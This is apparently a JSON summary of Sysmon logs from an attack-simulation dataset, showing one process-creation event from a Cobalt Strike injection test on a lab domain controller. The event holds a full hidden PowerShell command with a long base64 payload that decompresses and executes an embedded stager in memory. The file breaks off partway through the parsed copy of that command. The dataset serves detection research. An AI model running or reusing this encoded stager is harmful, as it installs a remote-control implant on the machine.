{
  "dataset_root": "datasets\\attack_techniques",
  "scope": "Sysmon XML logs only",
  "selection": "Longest XML event per EventID",
  "stats": {
    "files_total": 2880,
    "files_sysmon_candidates": 969,
    "events_extracted": 2903515,
    "events_valid_xml": 2903506,
    "events_sysmon": 2901353,
    "event_ids_total": 28
  },
  "events": {
    "1": {
      "event_id": "1",
      "length": 13746,
      "source_file": "datasets\\attack_techniques\\T1055\\cobalt_strike\\windows-sysmon.log",
      "event_index_in_file": 17164,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-02-23T21:56:50.664935700Z'/><EventRecordID>120521</EventRecordID><Correlation/><Execution ProcessID='3064' ThreadID='2356'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-177.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-02-23 21:56:50.663</Data><Data Name='ProcessGuid'>{64AF4F22-7A22-6035-3510-00000000AD01}</Data><Data Name='ProcessId'>3336</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='FileVersion'>10.0.14393.206 (rs1_release.160915-0644)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell  -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADMAUABhAE8AQgBQACsASABQADQASwBmAGMAaQBNADcAUwBsAFEARQB0AEkAMAA5AEMAWQB6ADUAWQBjAEIAOAB3AEsAQgBtAEMAUwAwAEgATQBNAEkAVwBRAFkAVABZADQARQBrAEcANQB4AHIALwAvAGQAMwBaAFcATwBPAFgAcABPADcAegB0AHgAbABoAG8AawBzADcAYQA1ADIAbgAzADEAMgBWAHoAYQBWAEIAVgB0AHkAagA4AGcAZQBjAHkAZwBxAFAARgBJAHUAUABCAGEAZwB5ADEAegB1AHYATQBFAHMAaQBXADcAUgBaAHkAMwBuAGgAZwBHAFIAYQBsAHMAdABaAGcAcwBxAFoAeAB2AE8AeQBBAHcANwBEAHEAZABDAG8ARAA5AHkAWgB3AFAATQA4AFIAcgBwADUAeABIAG0AcwB6AFYAegBRAHAALwBtAFUAZgBLAGgAQgBLAGsAVABjAG0AcQBjAG4AZQBYAE8AawBxADAAdwBFAE4AaQBsAHMAdwBCAEwATAA2AEsAegBOAFoAVgBMADUAZwBpADQAUwBKADkAVQBOADUAcwBHAFcAMgBNAHYAbQBIADcANgBWAEEAOAA1AHAANABGAE0AdgA0AHMAdABLAHEAdABDADAAUABYAGMAOQA2AGoAUQBEAGYAUQBOAFAAUwAwAHAAcAA0AFcANwArAFkAbwBTAGkAZgA1AEEANQA3AE4AaQB5ADIAZAB6ADcAQgAvAEUANABqAG8AbQBTAHcAaQBvAEcAagBqAHEAcgBNAHMASQBWAGgARQBVADcAWQAzAHYAUwBWADMANwAvAFgAZgBOAG0AQgBRAHUAcABrAFYAegBHADIASgBmADYASgBvAGQAQwAwAG4AWABSAGMAZgAzAE4AUQBOADkATgA5AFMARgBvADMAaABEAGQAYQAzAG4ARQBjADQARQBjADIAWAB4AHkAUQB2AEsAbAA4AFcASAB4AFAAdAArADQAbgB3AHYAOQBWADAAegBEAHAARQB0AE4AaABqAGkAZQBEAHQASQBaAFQAWABWADAAVABWAFkARABnAEMAYgBhAG8AcQBoAGwAawBjAFQAZABkADkAawBPAGsAVwBmAGoAOQA3AGMAaAA0AEgAMAAxAHIAUgBvAEIAWgBKAHkAdAByAEUAcABqAHoAeABDAFIAYgBHAE4AQQA4AGUAbgA5ADkAUQBGAE4AVQAxAEEAKwBvAEsARgBaAG8AQQBUAG4ATQBxAFEAQgB5AGoAegBCAGYAUQBpADkAawB6ADEAOAB5AEQAMAAvAFQAegBZAG4AZgB5AHEAMwBhAG4AZQBwADcAcwBNADMARgA5AFYAMABrACsAVgBRAEcAbwBnAHUAWgBFAC8AYwBPAEoAWAA0AE8AZwBsAHYARQBuAE4AUQBUAGcALwBlAFgAOQBDAEwAZwBQACsAZgBpAEsAWQBrAGYAdQBlAGUANABXAHEARAB2AFgAcABBAGsAcwA2AGsANABEAHYAQwBWAGQAegBaADIAZQBUAFoARQBrAGgASABuADMAQQBoAEoAZgBvADMAYQBKAFMASAB2AFgAQQBDAFMAdwBaAGoAMQBVADYAUgB6AHkAawB4AHYAVABQAC8ASwBUAFgAWgBwAG8AaQAvADYAYQBoAGkAMAB6AHIAbwBKAE8AbQBKAC8AWABqAEYAawAwAGUAbQBlAGQATQBjADIAZABHADcAcwBBAGUAdABUACsAYgBoADUANwB2AFUASwA3AE8AMwA2ADYARwBCAG4AVwA5AGcARABiAGkAQQBLADgAOQBrAGgARgBlAGYAeQAxAG4AMQBQAFYAcABnAGsAYwB4AEUAKwB1AEQAbgA3AHAAMgBPAEsAQgBPADQANABDAE8AcABnAEMAZAAvAEsAeABtAHIAagAxADUAMQBLADIAbAB6AGwAVQBKADUARgAyAEEAVgAwAEEASgA0ADAAZABuADAAaAB6AHEAbQBoAFgAMAA2AEIAcgB3AFMANwArAEIAcAB1AGMAdQBsAEIAbgBOAHAAQQArAGwARgBXAGUAMwBxADIALwBGADUAYgBxAFAAaABjAGkAagBRAFEAaAAxAFQAdgBMAEkAcAB0AGkAbgBUAGgANQBWAEEAKwBFAGQAagBxAHEAaABaAE0AbABTACsAOQBQAGQAWAB1AGgATABqADIAQQBoAE0AMwBOAFQANAB4AFYASQBEADEAZgBYAFcAUQBBAFYARQB4AEwASQBMAHMAQQB3AHMAagBlAFUAZQBOAGgAWABxAE8AUgBSADIAMwBOAG8ATABiAGEAOQBSAGUAYQBDADkAaQBvAG0AZABlAHoANwBVAEgASgBnAEsAWQBLAGMAdwBJADcAQwB3AHAAYQBLAE0AOQB6AEoALwA1AFUAZgBSAHQARwBtADAAbABwAHYAZgBMAG8ARwA2AGEAUQBMAE4AWAAyADgAZwBKADUAegBxAEsAaQBFAGIAbgBoAEIASABlADEAdgAzAE0ANwBxAEoAQwAwAEsAaABWAFUARwAwAG8AbgBUAFEAQQBEAGIAWgB6AEsAUABIAGoAMAB1AG8AYQA5AHAAKwBaACsASQA5ACsALwBjACsANwBIAEYALwBPAEIAbQBuAGQATgBEAEkAdgBXAGsARQBDAGUAMQBXAEsAcAB5AFMAUwBTAEoARwBpADYAMwBSAHkAdwBUADUATABnAEUAMQBKAHEAYwByAFcAdABZADAATwBzAHIATwAyAGwAagB1AGwAYQArAEMAYgBkAFcAMwBGAHMATgByADMAbgBMAGoASgByAHQAYgBkAHMAYwB3AFMAKwBDAFgAMwBuAGIATgBMAHYAZAB6AHYAMgBtAGQAdAA4AGwAWgBuAGcAMwBhAEoAYwA2AHIAagBXADgAYQBWAHkARgB1ADkAQQBLAFIANwBWAFMAdQBWAGsAQwB1AFoAZAB0AHkAMwBTAHQANgBJADUAOQB1AFEAagBYAFYAeABmAE8AeABvAHIANgBzAEMAYwArAGIAdAB1AGkAWQBVAFcATgBhAHYAdAB5AHkANQByAFgAQwA2ADkAeQBzAEoAUABxAEQAKwBlADcAaQAvAG4AWQBhAG4ANgBjAHQANQBwAFgANwBVAGYAUgBWAFAASgB0AEsANgBvADEAdAAvAFUASwBnAC8AVgA3AEsANgBxAHoARAB1AGoAZABYAEcAKwBDADIAcwA2ADUAbwBtAGIAbgBtAG8ANgA3AFoARgBlAFcATgB4AFEAdgA5AHYASAAvAEgAdAArAFoAWQBiAC8AegBwAFMAUgBXAFAAWQBqAEIAcgByAHkAUQBUAHIAMwBmAHMAVQByAHkANAA3AEwAYwBhAEoAVQBIAFgAMQA5AGkASgBsAFoAVwAzAFAAOQBnAGgAcAB1AFkAUABJAHYAVgBjADAAeABXAGQAbgB3ADMANgBzAFEAZwA5AC8AegBzADIAMwBaAHQAYgAxADkAKwBIAGIAMABmAHUASwBRAFMAMwBMAEgAKwB6AHUAbABZADUAVwBhADMAWAB0AHIAVABuAGYATgB5AHUAUQBuADcANAA5AEgARAA4ADgAcQAyAFEAZgA2AGEATgA5AG4AZABRADcAQQBWAHIAYwBXAFYASABiAEwAeABqAGsAUwB3AGYAMgBIAGIAegB0ADYAQgB3AEsASgB4AC8ASwBVADgAdwBNAHoAWgBrAFoAZABrAFAAKwA0ADEANABPADcAVABNADgAQwBIAGwATABlAHQAbQB6AGIARQBGAGQAVABpAEwAdAA5ADYAQgBEAEEAbgA3AFYANwBjAFgAYwBZAEQATwA3AEgAcABtAE4ASABxADAAdgAzAG8AZwB2ADgAbAArADkAMwBUAHgAYQBiAGQASgBwAFUAdAB5AEYAOAB2AG8AMQBvAHMAOABKAFYAUABuAHUAMwBLADMAZABOAGkAUABDAFkAVgB1AFcALwBYAFgAZwBaAGQAMABuADgAaAA1AFgAYgBsAGYAVwBOAGMARwBkAGwAKwB2ACsAVwBXAFAAdgBUAHMAaAAxADIALwB1AFgAeQBZAHQAMwBhAGwAdQBiAG4ALwBjAHQAKwA0AHIAegA0ADEAYQAyAEoAawAzAGcAKwBIAFoAcwAzAEUAWgBtADAANABhAHUANgBIAHcAMgBHAE4AcgBZAGkAMwBKAGEAUABGADcAYQAxAGkAbgBjAHMANAB6AEoARwA5ADYAcwAyAC8ASQBmAGgAZgA4AEMAVQA2ADgAZwByAFkAQgBFAFIAVgArACsALwBlAEcAYQBxAC8ASAAwADgAbQA1AC8AdABwAE4AbwArAFAAMwA0AFgANQBIAHEAeQBWAFAAeQBpAE8ASgBpAGMAUgBQAG0ASABtAFcAMABPAHUAaAA3AGwAWQBZAGgAOABZAEMANABNAHEAYQB6AE4ATgB4AHAAdQBIAGMAVABOAGcAbgB0AEwAUQA5AGQAZABmAFMATQArAFUAQgA5AFMASAAxAHcATwA4AEwANwBMAGkAcgBQAG8AKwBJADIAcABBAHYAagBHAHAAWQBGAHkAbgBRADMAUQBLAFQAZQBnAEIAbAB1AFgATABWADEAYwBHAE8AZwByAEMAVgBFAHgAagBtAG8AZQB1AG0AdwB5AFIAUQA0AFQAWgBMAE0AMABFAFAAMwAzADYAQwB1AEgAbABUADAARABzADAAbQBBAGgAbAAzAGwAVQAyAHAAZABMAHAAWgBMADYAZgAxAFUAeQBjAHIAOABPAFMANQAxAHQAWQB2ADEAbwBMAHEAKwBHADYASQBrAG4AcAB6AGYANQB5AFUAMwBHAEEAWAAwAGUAQgBtAHYANgBIAHkAYgBnAGgAMAB2AC8ARwBWAG8ARgBYAGoASwBIAGoAOQBBAGwARAByADIATwBsADUASABUAFAAdQBkAHkAbABvAHQATwA5AG8AWAAzAEEAcQA5AE0AdQBrAFUAMwBDAGYAZQBFAHgARgB3AFcAVgBtAHcATwBUADkASwBrAHgAKwByAG4AMgBFAEMAVwBPAFUAYgBuAEcASAAxAEgAQgBRAGkAdgBLAHMAcQBYADgAQwA3AGwAaQAxAEEAMQBYAEoAUQArAHMANwArAGgASABmAFoAUwB4AFcALwBvAG4AaABJAEsAegA2AFIAQwBoADgAMgBCAHAAUgBUAG0AcABqAEsAZABHAEYASABDAHMAUABkAC8AMgAvAHkAMABvADcAYwBMAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=</Data><Data Name='CurrentDirectory'>C:\\Windows\\system32\\</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data><Data Name='LogonGuid'>{64AF4F22-4083-6035-E703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data><Data Name='ParentProcessGuid'>{64AF4F22-7A22-6035-3410-00000000AD01}</Data><Data Name='ParentProcessId'>6832</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADMAUABhAE8AQgBQACsASABQADQASwBmAGMAaQBNADcAUwBsAFEARQB0AEkAMAA5AEMAWQB6ADUAWQBjAEIAOAB3AEsAQgBtAEMAUwAwAEgATQBNAEkAVwBRAFkAVABZADQARQBrAEcANQB4AHIALwAvAGQAMwBaAFcATwBPAFgAcABPADcAegB0AHgAbABoAG8AawBzADcAYQA1ADIAbgAzADEAMgBWAHoAYQBWAEIAVgB0AHkAagA4AGcAZQBjAHkAZwBxAFAARgBJAHUAUABCAGEAZwB5ADEAegB1AHYATQBFAHMAaQBXADcAUgBaAHkAMwBuAGgAZwBHAFIAYQBsAHMAdABaAGcAcwBxAFoAeAB2AE8AeQBBAHcANwBEAHEAZABDAG8ARAA5AHkAWgB3AFAATQA4AFIAcgBwADUAeABIAG0AcwB6AFYAegBRAHAALwBtAFUAZgBLAGgAQgBLAGsAVABjAG0AcQBjAG4AZQBYAE8AawBxADAAdwBFAE4AaQBsAHMAdwBCAEwATAA2AEsAegBOAFoAVgBMADUAZwBpADQAUwBKADkAVQBOADUAcwBHAFcAMgBNAHYAbQBIADcANgBWAEEAOAA1AHAANABGAE0AdgA0AHMAdABLAHEAdABDADAAUABYAGMAOQA2AGoAUQBEAGYAUQBOAFAAUwAwAHAAcAA0AFcANwArAFkAbwBTAGkAZgA1AEEANQA3AE4AaQB5ADIAZAB6ADcAQgAvAEUANABqAG8AbQBTAHcAaQBvAEcAagBqAHEAcgBNAHMASQBWAGgARQBVADcAWQAzAHYAUwBWADMANwAvAFgAZgBOAG0AQgBRAHUAcABrAFYAegBHADIASgBmADYASgBvAGQAQwAwAG4AWABSAGMAZgAzAE4AUQBOADkATgA5AFMARgBvADMAaABEAGQAYQAzAG4ARQBjADQARQBjADIAWAB4AHkAUQB2AEsAbAA4AFcASAB4AFAAdAArADQAbgB3AHYAOQBWADAAegBEAHAARQB0AE4AaABqAGkAZQBEAHQASQBaAFQAWABWADAAVABWAFkARABnAEMAYgBhAG8AcQBoAGwAawBjAFQAZABkADkAawBPAGsAVwBmAGoAOQA3AGMAaAA0AEgAMAAxAHIAUgBvAEIAWgBKAHkAdAByAEUAcABqAHoAeABDAFIAYgBHAE4AQQA4AGUAbgA5ADkAUQBGAE4AVQAxAEEAKwBvAEsARgBaAG8AQQBUAG4ATQBxAFEAQgB5AGoAegBCAGYAUQBpADkAawB6ADEAOAB5AEQAMAAvAFQAegBZAG4AZgB5AHEAMwBhAG4AZQBwADcAcwBNADMARgA5AFYAMABrACsAVgBRAEcAbwBnAHUAWgBFAC8AYwBPAEoAWAA0AE8AZwBsAHYARQBuAE4AUQBUAGcALwBlAFgAOQBDAEwAZwBQACsAZgBpAEsAWQBrAGYAdQBlAGUANABXAHEARAB2AFgAcABBAGsAcwA2AGsANABEAHYAQwBWAGQAegBaADIAZQBUAFoARQBrAGgASABuADMAQQBoAEoAZgBvADMAYQBKAFMASAB2AFgAQQBDAFMAdwBaAGoAMQBVADYAUgB6AHkAawB4AHYAVABQAC8ASwBUAFgAWgBwAG8AaQAvADYAYQBoAGkAMAB6AHIAbwBKAE8AbQBKAC8AWABqAEYAawAwAGUAbQBlAGQATQBjADIAZABHADcAcwBBAGUAdABUACsAYgBoADUANwB2AFUASwA3AE8AMwA2ADYARwBCAG4AVwA5AGcARABiAGkAQQBLADgAOQBrAGgARgBlAGYAeQAxAG4AMQBQAFYAcABnAGsAYwB4AEUAKwB1AEQAbgA3AHAAMgBPAEsAQgBPADQANABDAE8AcABnAEMAZAAvAEsAeABtAHIAagAxADUAMQBLADIAbAB6AGwAVQBKADUARgAyAEEAVgAwAEEASgA0ADAAZABuADAAaAB6AHEAbQBoAFgAMAA2AEIAcgB3AFMANwArAEIAcAB1AGMAdQBsAEIAbgBOAHAAQQArAGwARgBXAGUAMwBxADIALwBGADUAYgBxAFAAaABjAGkAagBRAFEAaAAxAFQAdgBMAEkAcAB0AGkAbgBUAGgANQBWAEEAKwBFAGQAagBxAHEAaABaAE0AbABTACsAOQBQAGQAWAB1AGgATABqADIAQQBoAE0AMwBOAFQANAB4AFYASQBEADEAZgBYAFcAUQBBAFYARQB4AEwASQBMAHMAQQB3AHMAagBlAFUAZQBOAGgAWABxAE8AUgBSADIAMwBOAG8ATABiAGEAOQBSAGUAYQBDADkAaQBvAG0AZABlAHoANwBVAEgASgBnAEsAWQBLAGMAdwBJADcAQwB3AHAAYQBLAE0AOQB6AEoALwA1AFUAZgBSAHQARwBtADAAbABwAHYAZgBMAG8ARwA2AGEAUQBMAE4AWAAyADgAZwBKADUAegBxAEsAaQBFAGIAbgBoAEIASABlADEAdgAzAE0ANwBxAEoAQwAwAEsAaABWAFUARwAwAG8AbgBUAFEAQQBEAGIAWgB6AEsAUABIAGoAMAB1AG8AYQA5AHAAKwBaACsASQA5ACsALwBjACsANwBIAEYALwBPAEIAbQBuAGQATgBEAEkAdgBXAGsARQBDAGUAMQBXAEsAcAB5AFMAUwBTAEoARwBpADYAMwBSAHkAdwBUADUATABnAEUAMQBKAHEAYwByAFcAdABZADAATwBzAHIATwAyAGwAagB1AGwAYQArAEMAYgBkAFcAMwBGAHMATgByADMAbgBMAGoASgByAHQAYgBkAHMAYwB3AFMAKwBDAFgAMwBuAGIATgBMAHYAZAB6AHYAMgBtAGQAdAA4AGwAWgBuAGcAMwBhAEoAYwA2AHIAagBXADgAYQBWAHkARgB1ADkAQQBLAFIANwBWAFMAdQBWAGsAQwB1AFoAZAB0AHkAMwBTAHQANgBJADUAOQB1AFEAagBYAFYAeABmAE8AeABvAHIANgBzAEMAYwArAGIAdAB1AGkAWQBVAFcATgBhAHYAdAB5AHkANQByAFgAQwA2ADkAeQBzAEoAUABxAEQAKwBlADcAaQAvAG4AWQBhAG4ANgBjAHQANQBwAFgANwBVAGYAUgBWAFAASgB0AEsANgBvADEAdAAvAFUASwBnAC8AVgA3AEsANgBxAHoARAB1AGoAZABYAEcAKwBDADIAcwA2ADUAbwBtAGIAbgBtAG8ANgA3AFoARgBlAFcATgB4AFEAdgA5AHYASAAvAEgAdAArAFoAWQBiAC8AegBwAFMAUgBXAFAAWQBqAEIAcgByAHkAUQBUAHIAMwBmAHMAVQByAHkANAA3AEwAYwBhAEoAVQBIAFgAMQA5AGkASgBsAFoAVwAzAFAAOQBnAGgAcAB1AFkAUABJAHYAVgBjADAAeABXAGQAbgB3ADMANgBzAFEAZwA5AC8AegBzADIAMwBaAHQAYgAxADkAKwBIAGIAMABmAHUASwBRAFMAMwBMAEgAKwB6AHUAbABZADUAVwBhADMAWAB0AHIAVABuAGYATgB5AHUAUQBuADcANAA5AEgARAA4ADgAcQAyAFEAZgA2AGEATgA5AG4AZABRADcAQQBWAHIAYwBXAFYASABiAEwAeABqAGsAUwB3AGYAMgBIAGIAegB0ADYAQgB3AEsASgB4AC8ASwBVADgAdwBNAHoAWgBrAFoAZABrAFAAKwA0ADEANABPADcAVABNADgAQwBIAGwATABlAHQAbQB6AGIARQBGAGQAVABpAEwAdAA5ADYAQgBEAEEAbgA3AFYANwBjAFgAYwBZAEQATwA3AEgAcABtAE4ASABxADAAdgAzAG8AZwB2ADgAbAArADkAMwBUAHgAYQBiAGQASgBwAFUAdAB5AEYAOAB2AG8AMQBvAHMAOABKAFYAUABuAHUAMwBLADMAZABOAGkAUABDAFkAVgB1AFcALwBYAFgAZwBaAGQAMABuADgAaAA1AFgAYgBsAGYAVwBOAGMARwBkAGwAKwB2ACsAVwBXAFAAdgBUAHMAaAAxADIALwB1AFgAeQBZAHQAMwBhAGwAdQBiAG4ALwBjAHQAKwA0AHIAegA0ADEAYQAyAEoAawAzAGcAKwBIAFoAcwAzAEUAWgBtADAANABhAHUANgBIAHcAMgBHAE4AcgBZAGkAMwBKAGEAUABGADcAYQAxAGkAbgBjAHMANAB6AEoARwA5ADYAcwAyAC8ASQBmAGgAZgA4AEMAVQA2ADgAZwByAFkAQgBFAFIAVgArACsALwBlAEcAYQBxAC8ASAAwADgAbQA1AC8AdABwAE4AbwArAFAAMwA0AFgANQBIAHEAeQBWAFAAeQBpAE8ASgBpAGMAUgBQAG0ASABtAFcAMABPAHUAaAA3AGwAWQBZAGgAOABZAEMANABNAHEAYQB6AE4ATgB4AHAAdQBIAGMAVABOAGcAbgB0AEwAUQA5AGQAZABmAFMATQArAFUAQgA5AFMASAAxAHcATwA4AEwANwBMAGkAcgBQAG8AKwBJADIAcABBAHYAagBHAHAAWQBGAHkAbgBRADMAUQBLAFQAZQBnAEIAbAB1AFgATABWADEAYwBHAE8AZwByAEMAVgBFAHgAagBtAG8AZQB1AG0AdwB5AFIAUQA0AFQAWgBMAE0AMABFAFAAMwAzADYAQwB1AEgAbABUADAARABzADAAbQBBAGgAbAAzAGwAVQAyAHAAZABMAHAAWgBMADYAZgAxAFUAeQBjAHIAOABPAFMANQAxAHQAWQB2ADEAbwBMAHEAKwBHADYASQBrAG4AcAB6AGYANQB5AFUAMwBHAEEAWAAwAGUAQgBtAHYANgBIAHkAYgBnAGgAMAB2AC8ARwBWAG8ARgBYAGoASwBIAGoAOQBBAGwARAByADIATwBsADUASABUAFAAdQBkAHkAbABvAHQATwA5AG8AWAAzAEEAcQA5AE0AdQBrAFUAMwBDAGYAZQBFAHgARgB3AFcAVgBtAHcATwBUADkASwBrAHgAKwByAG4AMgBFAEMAVwBPAFUAYgBuAEcASAAxAEgAQgBRAGkAdgBLAHMAcQBYADgAQwA3AGwAaQAxAEEAMQBYAEoAUQArAHMANwArAGgASABmAFoAUwB4AFcALwBvAG4AaABJAEsAegA2AFIAQwBoADgAMgBCAHAAUgBUAG0AcABqAEsAZABHAEYASABDAHMAUABkAC8AMgAvAHkAMABvADcAYwBMAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "1",
        "Timestamp": "2021-02-23T21:56:50.664935700Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-177.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "1",
          "Version": "5",
          "Level": "4",
          "Task": "1",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2021-02-23T21:56:50.664935700Z"
          },
          "EventRecordID": "120521",
          "Correlation": "",
          "Execution": {
            "ProcessID": "3064",
            "ThreadID": "2356"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-177.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "UtcTime": "2021-02-23 21:56:50.663",
          "ProcessGuid": "{64AF4F22-7A22-6035-3510-00000000AD01}",
          "ProcessId": "3336",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "FileVersion": "10.0.14393.206 (rs1_release.160915-0644)",
          "Description": "Windows PowerShell",
          "Product": "Microsoft® Windows® Operating System",
          "Company": "Microsoft Corporation",
          "OriginalFileName": "PowerShell.EXE",
          "CommandLine": "powershell  -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADMAUABhAE8AQgBQACsASABQADQASwBmAGMAaQBNADcAUwBsAFEARQB0AEkAMAA5AEMAWQB6ADUAWQBjAEIAOAB3AEsAQgBtAEMAUwAwAEgATQBNAEkAVwBRAFkAVABZADQARQBrAEcANQB4AHIALwAvAGQAMwBaAFcATwBPAFgAcABPADcAegB0AHgAbABoAG8AawBzADcAYQA1ADIAbgAzADEAMgBWAHoAYQBWAEIAVgB0AHkAagA4AGcAZQBjAHkAZwBxAFAARgBJAHUAUABCAGEAZwB5ADEAegB1AHYATQBFAHMAaQBXADcAUgBaAHkAMwBuAGgAZwBHAFIAYQBsAHMAdABaAGcAcwBxAFoAeAB2AE8AeQBBAHcANwBEAHEAZABDAG8ARAA5AHkAWgB3AFAATQA4AFIAcgBwADUAeABIAG0AcwB6AFYAegBRAHAALwBtAFUAZgBLAGgAQgBLAGsAVABjAG0AcQBjAG4AZQBYAE8AawBxADAAdwBFAE4AaQBsAHMAdwBCAEwATAA2AEsAegBOAFoAVgBMADUAZwBpADQAUwBKADkAVQBOADUAcwBHAFcAMgBNAHYAbQBIADcANgBWAEEAOAA1AHAANABGAE0AdgA0AHMAdABLAHEAdABDADAAUABYAGMAOQA2AGoAUQBEAGYAUQBOAFAAUwAwAHAAcAA0AFcANwArAFkAbwBTAGkAZgA1AEEANQA3AE4AaQB5ADIAZAB6ADcAQgAvAEUANABqAG8AbQBTAHcAaQBvAEcAagBqAHEAcgBNAHMASQBWAGgARQBVADcAWQAzAHYAUwBWADMANwAvAFgAZgBOAG0AQgBRAHUAcABrAFYAegBHADIASgBmADYASgBvAGQAQwAwAG4AWABSAGMAZgAzAE4AUQBOADkATgA5AFMARgBvADMAaABEAGQAYQAzAG4ARQBjADQARQBjADIAWAB4AHkAUQB2AEsAbAA4AFcASAB4AFAAdAArADQAbgB3AHYAOQBWADAAegBEAHAARQB0AE4AaABqAGkAZQBEAHQASQBaAFQAWABWADAAVABWAFkARABnAEMAYgBhAG8AcQBoAGwAawBjAFQAZABkADkAawBPAGsAVwBmAGoAOQA3AGMAaAA0AEgAMAAxAHIAUgBvAEIAWgBKAHkAdAByAEUAcABqAHoAeABDAFIAYgBHAE4AQQA4AGUAbgA5ADkAUQBGAE4AVQAxAEEAKwBvAEsARgBaAG8AQQBUAG4ATQBxAFEAQgB5AGoAegBCAGYAUQBpADkAawB6ADEAOAB5AEQAMAAvAFQAegBZAG4AZgB5AHEAMwBhAG4AZQBwADcAcwBNADMARgA5AFYAMABrACsAVgBRAEcAbwBnAHUAWgBFAC8AYwBPAEoAWAA0AE8AZwBsAHYARQBuAE4AUQBUAGcALwBlAFgAOQBDAEwAZwBQACsAZgBpAEsAWQBrAGYAdQBlAGUANABXAHEARAB2AFgAcABBAGsAcwA2AGsANABEAHYAQwBWAGQAegBaADIAZQBUAFoARQBrAGgASABuADMAQQBoAEoAZgBvADMAYQBKAFMASAB2AFgAQQBDAFMAdwBaAGoAMQBVADYAUgB6AHkAawB4AHYAVABQAC8ASwBUAFgAWgBwAG8AaQAvADYAYQBoAGkAMAB6AHIAbwBKAE8AbQBKAC8AWABqAEYAawAwAGUAbQBlAGQATQBjADIAZABHADcAcwBBAGUAdABUACsAYgBoADUANwB2AFUASwA3AE8AMwA2ADYARwBCAG4AVwA5AGcARABiAGkAQQBLADgAOQBrAGgARgBlAGYAeQAxAG4AMQBQAFYAcABnAGsAYwB4AEUAKwB1AEQAbgA3AHAAMgBPAEsAQgBPADQANABDAE8AcABnAEMAZAAvAEsAeABtAHIAagAxADUAMQBLADIAbAB6AGwAVQBKADUARgAyAEEAVgAwAEEASgA0ADAAZABuADAAaAB6AHEAbQBoAFgAMAA2AEIAcgB3AFMANwArAEIAcAB1AGMAdQBsAEIAbgBOAHAAQQArAGwA